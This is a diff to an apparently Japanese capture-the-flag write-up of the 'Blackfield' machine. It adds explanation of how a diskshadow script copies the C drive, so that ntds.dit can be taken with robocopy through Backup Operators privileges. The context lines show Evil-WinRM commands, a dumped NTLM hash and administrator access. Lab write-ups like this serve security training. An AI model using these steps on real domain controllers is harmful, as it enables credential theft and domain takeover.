@@ -274,13 +274,17 @@ expose %cdrive% E:X
 end backupX
 ```
 
-次のように`diskshadow`コマンドを実行する：
+これは、`diskshadow`コマンドに実行させる命令を並べたもの（`diskshadow`の`/s`オプションでスクリプト実行）。
+
+この命令群により、新しくEドライブが作られ、そのドライブにCドライブごとコピーされる。
+
+次のように実行する：
 
 ```
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s back_script.txt
 ```
 
-Eドライブ中のntds.ditをコピーrobocopyしてやる：
+Eドライブ中のntds.ditをrobocopyしてやる：
 
 ```
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cd C:\ 
@@ -325,3 +329,5 @@ support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 blackfield\administrator
 ```
+
+このやり方は[Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#abusing-backup-operators-group)にも載ってる方法。
